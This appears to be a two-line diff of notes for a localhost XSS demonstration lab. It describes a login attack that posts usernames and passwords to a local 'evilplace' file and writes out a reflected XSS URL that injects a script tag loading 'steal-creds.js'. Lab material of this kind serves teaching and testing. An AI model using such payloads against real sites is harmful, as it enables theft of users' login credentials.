@@ -1,0 +1,2 @@
+XSS login attack posts username and password to http://localhost/evilplace/uno.txt
+http://loalhost/aria-pages/forms/xss-demo/index.php?search=<script src="http://localhost/evilplace/steal-creds.js"></script>
